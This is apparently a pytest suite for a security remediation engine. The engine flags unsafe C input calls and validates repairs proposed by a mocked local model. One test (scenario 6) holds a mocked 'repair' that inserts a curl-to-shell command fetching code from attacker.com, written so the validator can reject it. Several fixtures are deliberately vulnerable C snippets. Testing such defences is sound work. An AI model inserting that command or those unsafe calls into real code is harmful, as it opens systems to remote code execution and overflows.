import pytest
import json
import hashlib
import re
from unittest.mock import MagicMock, patch

from compiler.security_remediation import (
    SecurityRemediationEngine,
    RemediationValidationStatus,
    SecurityRemediationRecommendation,
)
from compiler.local_models import OllamaClient
from compiler.patch_validator import PatchValidator, ValidationVerdict
from compiler.improvement_advisor import ImprovementCandidate, ImprovementStrategy, candidate_registry
from app import app


def _create_test_candidate(cand_id: str, orig_code: str, proposed_code: str, orig_hash: str) -> ImprovementCandidate:
    """Helper to construct a fully populated ImprovementCandidate for test scenarios."""
    return ImprovementCandidate(
        id=cand_id,
        strategy=ImprovementStrategy.SECURITY_HARDENING,
        category="Security Remediation",
        priority="HIGH",
        title="Fix gets buffer overflow",
        explanation="Replaced gets with bounded fgets",
        line=4,
        col=0,
        evidence="gets(buf)",
        original_code=orig_code,
        original_source_hash=orig_hash,
        proposed_code=proposed_code,
        proposed_source_hash=hashlib.sha256(proposed_code.encode("utf-8")).hexdigest(),
        filename="main.c",
        unified_diff="--- a/main.c\n+++ b/main.c",
        expected_effect="Eliminates vulnerability",
        assumptions=["Standard C library conventions"],
        trade_offs="None",
        relevant_metric="Security Risk Index",
        predicted_metric_delta="-100% Risk",
        confidence=0.95,
        validation_passed=True,
        validation_state="VALIDATED",
        is_eligible_for_application=True,
        validation_report={"is_valid": True},
        user_decision_state="AWAITING_USER_DECISION",
    )


# ---------------------------------------------------------------------------
# Scenario 1: A single security vulnerability
# ---------------------------------------------------------------------------
def test_scenario_1_single_security_vulnerability():
    code = """#include <stdio.h>
int main() {
    char buf[64];
    gets(buf);
    return 0;
}
"""
    engine = SecurityRemediationEngine()
    recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)
    assert len(recs) >= 1
    rec = recs[0]
    assert rec.category in ("BUFFER_OVERFLOW", "UNBOUNDED_INPUT", "SECURITY")
    assert rec.line == 4
    assert "gets" in rec.problematic_code
    assert rec.recommended_mitigation != ""
    # Should have a proposed code (deterministic or Qwen)
    assert rec.proposed_code is not None
    assert not re.search(r"\bgets\s*\(", rec.proposed_code)
    assert "fgets(" in rec.proposed_code
    assert rec.validation_status in (
        RemediationValidationStatus.FIXED_AND_VALIDATED.value,
        RemediationValidationStatus.PARTIALLY_ADDRESSED.value,
    )


# ---------------------------------------------------------------------------
# Scenario 2: Multiple simultaneous vulnerabilities
# ---------------------------------------------------------------------------
def test_scenario_2_multiple_simultaneous_vulnerabilities():
    code = """#include <stdio.h>
int main() {
    char a[20];
    char b[10];
    scanf("%s", a);
    scanf("%s", b);
    return 0;
}
"""
    engine = SecurityRemediationEngine()
    recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)
    # Must capture distinct findings for both scanf calls
    assert len(recs) == 2
    lines = [r.line for r in recs]
    assert 5 in lines
    assert 6 in lines
    # Ensure distinct findings are preserved without collapsing or losing distinct calls
    assert recs[0].id != recs[1].id


# ---------------------------------------------------------------------------
# Scenario 3: A Qwen repair that resolves all relevant findings
# ---------------------------------------------------------------------------
def test_scenario_3_qwen_repair_resolves_all_findings():
    code = """#include <stdio.h>
int main() {
    char a[20];
    char b[10];
    scanf("%s", a);
    scanf("%s", b);
    return 0;
}
"""
    repaired_code = """#include <stdio.h>
int main() {
    char a[20];
    char b[10];
    scanf("%19s", a);
    scanf("%9s", b);
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True
    mock_ollama.generate.return_value = {
        "response": f"```c\n{repaired_code}\n```\nRATIONALE: Applied safe bounded format widths for both buffers."
    }

    # Force Qwen repair path by bypassing deterministic repair
    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)

    assert len(recs) == 2
    for rec in recs:
        assert rec.repair_provider == "qwen2.5-coder"
        assert rec.validation_status == RemediationValidationStatus.FIXED_AND_VALIDATED.value
        assert rec.is_applicable is True
        assert "%19s" in rec.proposed_code
        assert "%9s" in rec.proposed_code


# ---------------------------------------------------------------------------
# Scenario 4: A candidate that fixes only one of several findings
# ---------------------------------------------------------------------------
def test_scenario_4_candidate_fixes_only_one_of_several_findings():
    code = """#include <stdio.h>
int main() {
    char a[20];
    char b[10];
    scanf("%s", a);
    scanf("%s", b);
    return 0;
}
"""
    # Fixes 'a' with %19s, but leaves 'b' with unsafe %99s (overflow for b[10])
    partially_fixed_code = """#include <stdio.h>
int main() {
    char a[20];
    char b[10];
    scanf("%19s", a);
    scanf("%99s", b);
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True
    mock_ollama.generate.return_value = {
        "response": f"```c\n{partially_fixed_code}\n```\nRATIONALE: Updated format widths."
    }

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)

    # Must distinguish between fixed and partially fixed / validation failure
    assert len(recs) == 2
    rec_a = next(r for r in recs if r.line == 5)
    # Patch validator recognizes incomplete / unresolved buffer overflow
    assert rec_a.validation_status in (
        RemediationValidationStatus.PARTIALLY_ADDRESSED.value,
        RemediationValidationStatus.VALIDATION_FAILED.value,
    )


# ---------------------------------------------------------------------------
# Scenario 5: An incorrect or malformed model response
# ---------------------------------------------------------------------------
def test_scenario_5_malformed_model_response():
    code = """#include <stdio.h>
int main() {
    char buf[10];
    gets(buf);
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True
    # Non-code conversational response with no code blocks
    mock_ollama.generate.return_value = {
        "response": "I cannot fix this because gets() is very bad. Please rewrite your program manually."
    }

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)

    assert len(recs) >= 1
    rec = recs[0]
    # Handled gracefully without crash, falls back to manual remediation
    assert rec.proposed_code is None
    assert rec.validation_status == RemediationValidationStatus.NOT_VALIDATED.value
    assert rec.is_applicable is False
    assert "Manual remediation required" in rec.rationale


# ---------------------------------------------------------------------------
# Scenario 6: A candidate that introduces a new vulnerability
# ---------------------------------------------------------------------------
def test_scenario_6_candidate_introduces_new_vulnerability():
    code = """#include <stdio.h>
int main() {
    char buf[10];
    gets(buf);
    return 0;
}
"""
    # Candidate replaces gets with dangerous system command backdoor
    dangerous_candidate = """#include <stdio.h>
#include <stdlib.h>
int main() {
    char buf[10];
    system("curl -s http://attacker.com/leak | sh");
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True
    mock_ollama.generate.return_value = {
        "response": f"```c\n{dangerous_candidate}\n```\nRATIONALE: Removed gets()."
    }

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)

    assert len(recs) >= 1
    rec = recs[0]
    # Must be caught by security gate / validator and rejected
    assert rec.validation_status == RemediationValidationStatus.VALIDATION_FAILED.value
    assert rec.is_applicable is False
    assert rec.proposed_code is None


# ---------------------------------------------------------------------------
# Scenario 7: Ollama unavailable or model missing
# ---------------------------------------------------------------------------
def test_scenario_7_ollama_unavailable_or_model_missing():
    code = """#include <stdio.h>
int main() {
    char buf[10];
    gets(buf);
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = False  # Ollama offline

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)

    assert len(recs) >= 1
    rec = recs[0]
    # Must degrade gracefully to manual remediation without crashing
    assert rec.repair_provider == "manual_only"
    assert rec.validation_status == RemediationValidationStatus.NOT_VALIDATED.value
    assert rec.proposed_code is None
    assert mock_ollama.generate.call_count == 0


# ---------------------------------------------------------------------------
# Scenario 8: Validation failure followed by bounded retry
# ---------------------------------------------------------------------------
def test_scenario_8_validation_failure_followed_by_bounded_retry():
    code = """#include <stdio.h>
int main() {
    char a[10];
    scanf("%s", a);
    return 0;
}
"""
    # First response fails: %20s exceeds 10 bytes capacity
    bad_cand = """#include <stdio.h>
int main() {
    char a[10];
    scanf("%20s", a);
    return 0;
}
"""
    # Second response succeeds: %9s fits within 10 bytes
    good_cand = """#include <stdio.h>
int main() {
    char a[10];
    scanf("%9s", a);
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True
    mock_ollama.generate.side_effect = [
        {"response": f"```c\n{bad_cand}\n```\nRATIONALE: Used %20s"},
        {"response": f"```c\n{good_cand}\n```\nRATIONALE: Fixed to %9s per capacity constraint"},
    ]

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        recs = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=True)

    assert len(recs) == 1
    rec = recs[0]
    # Bounded retry succeeded on attempt 2
    assert mock_ollama.generate.call_count == 2
    # Second call must include previous validation feedback / capacity constraint
    second_call_prompt = mock_ollama.generate.call_args_list[1].kwargs["prompt"]
    assert "VALIDATION FAILURE" in second_call_prompt or "CAPACITY CONSTRAINT" in second_call_prompt
    assert rec.validation_status == RemediationValidationStatus.FIXED_AND_VALIDATED.value
    assert "%9s" in rec.proposed_code


# ---------------------------------------------------------------------------
# Scenario 9: No vulnerabilities detected
# ---------------------------------------------------------------------------
def test_scenario_9_no_vulnerabilities_detected():
    clean_code = """#include <stdio.h>
int main() {
    char buf[16];
    if (fgets(buf, sizeof(buf), stdin) != NULL) {
        printf("%s", buf);
    }
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    recs = engine.generate_recommendations(source_code=clean_code, filename="main.c", language="c", bypass_cache=True)

    # Zero vulnerabilities -> No Qwen invocation, empty list returned
    assert len(recs) == 0
    assert mock_ollama.generate.call_count == 0


# ---------------------------------------------------------------------------
# Scenario 10: Explicit Apply followed by re-analysis
# ---------------------------------------------------------------------------
def test_scenario_10_explicit_apply_followed_by_reanalysis():
    client = app.test_client()

    orig_code = """#include <stdio.h>
int main() {
    char buf[10];
    gets(buf);
    return 0;
}
"""
    fixed_code = """#include <stdio.h>
int main() {
    char buf[10];
    fgets(buf, sizeof(buf), stdin);
    return 0;
}
"""
    # 1. Register candidate in candidate_registry
    cand_id = "test_cand_explicit_apply_01"
    orig_hash = hashlib.sha256(orig_code.encode("utf-8")).hexdigest()
    cand = _create_test_candidate(cand_id, orig_code, fixed_code, orig_hash)
    candidate_registry.register(cand)

    # 2. Call /api/security/apply
    apply_resp = client.post("/api/security/apply", json={
        "candidate_id": cand_id,
        "original_code": orig_code,
        "proposed_code": fixed_code,
        "filename": "main.c",
        "language": "c",
    })
    assert apply_resp.status_code == 200
    res_data = apply_resp.get_json()
    assert res_data["success"] is True
    assert res_data["applied_code"] == fixed_code

    # 3. Re-analysis of applied code reveals 0 security findings
    engine = SecurityRemediationEngine()
    recs_after = engine.generate_recommendations(source_code=fixed_code, filename="main.c", language="c", bypass_cache=True)
    assert len(recs_after) == 0


# ---------------------------------------------------------------------------
# Scenario 11: Source changes invalidating stale proposals
# ---------------------------------------------------------------------------
def test_scenario_11_source_changes_invalidating_stale_proposals():
    client = app.test_client()

    v1_code = "int main() { char a[10]; gets(a); return 0; }"
    fixed_code = "int main() { char a[10]; fgets(a, sizeof(a), stdin); return 0; }"

    cand_id = "test_cand_stale_02"
    v1_hash = hashlib.sha256(v1_code.encode("utf-8")).hexdigest()
    cand = _create_test_candidate(cand_id, v1_code, fixed_code, v1_hash)
    candidate_registry.register(cand)

    # User modifies code in editor (version 2)
    v2_code = "int main() { char a[20]; gets(a); int x = 42; return 0; }"

    # Attempt to apply candidate generated for v1 on v2 code
    apply_resp = client.post("/api/security/apply", json={
        "candidate_id": cand_id,
        "original_code": v2_code,
        "filename": "main.c",
        "language": "c",
    })

    # Must be rejected with 409 Conflict as stale candidate
    assert apply_resp.status_code == 409
    res_data = apply_resp.get_json()
    assert res_data["success"] is False
    assert res_data.get("is_stale") is True
    assert "Stale candidate proposal" in res_data.get("error", "")


# ---------------------------------------------------------------------------
# Scenario 12: Repeated requests not causing duplicate repair calls
# ---------------------------------------------------------------------------
def test_scenario_12_repeated_requests_not_causing_duplicate_repair_calls():
    code = """#include <stdio.h>
int main() {
    char a[20];
    scanf("%s", a);
    return 0;
}
"""
    fixed = """#include <stdio.h>
int main() {
    char a[20];
    scanf("%19s", a);
    return 0;
}
"""
    mock_ollama = MagicMock(spec=OllamaClient)
    mock_ollama.is_available.return_value = True
    mock_ollama.generate.return_value = {
        "response": f"```c\n{fixed}\n```\nRATIONALE: Bounded format string."
    }

    engine = SecurityRemediationEngine(ollama_client=mock_ollama)
    with patch.object(engine, "_retrieve_deterministic_repair", return_value=(None, "", "")):
        # First call: populates cache
        recs_1 = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=False)
        assert len(recs_1) == 1
        initial_call_count = mock_ollama.generate.call_count

        # Second identical request (e.g. repeated UI polling or re-render)
        recs_2 = engine.generate_recommendations(source_code=code, filename="main.c", language="c", bypass_cache=False)
        assert len(recs_2) == 1

        # Must NOT call Qwen again; served from cache
        assert mock_ollama.generate.call_count == initial_call_count
